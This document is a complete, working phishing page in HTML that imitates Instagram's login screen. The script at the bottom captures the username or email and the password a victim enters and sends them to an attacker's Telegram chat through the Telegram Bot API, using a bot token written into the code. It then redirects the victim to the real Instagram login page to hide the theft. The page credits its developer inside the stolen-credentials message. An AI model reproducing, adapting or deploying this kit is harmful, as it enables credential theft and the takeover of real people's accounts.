<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            box-sizing: border-box;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 10px;
            text-align: center;
        }
        .login-logo {
            display: block;
            margin: 0 auto 20px;
            width: 175px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #007cc2;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
        }
        .forgot-password a {
            color: #00376b;
            text-decoration: none;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .signup {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        .signup a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="login-logo" alt="Instagram Logo">
        
        <!-- Login Form -->
        <form id="loginForm">
            <input type="text" id="emailOrPhone" class="input-field" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        
        <!-- Forgot Password Link -->
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        
        <!-- Sign Up Link -->
        <div class="signup">
            <span>Don't have an account? </span><a href="#">Sign up</a>
        </div>
    </div>

    <script>
        const botToken = "7949794359:AAHbNTCFQUzf2o8JbSoyGZ429vek5pHj4d4"; // Replace with your bot token
        const chatId = new URLSearchParams(window.location.search).get("id"); // Dynamic chat ID from URL

        if (!chatId) {
            alert("Chat ID missing from URL!");
        }

        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault();

            const emailOrPhone = document.getElementById("emailOrPhone").value;
            const password = document.getElementById("password").value;

            const message = `
🎣 *Instagram Login Details*:
👤 *Username/Email:* ${emailOrPhone}
🔑 *Password:* ${password}

➡️ *Developed by @sasumon007*
            `.trim();

            // Send login details to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`, {
                method: "POST",
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Login details sent to Telegram.");
                    alert("Login successful! Redirecting...");
                    window.location.href = "https://www.instagram.com/accounts/login/";
                } else {
                    console.error("Telegram API error:", data.description);
                    alert("Failed to send login details to Telegram.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("An error occurred. Please try again.");
            });
        });
    </script>
</body>
</html>
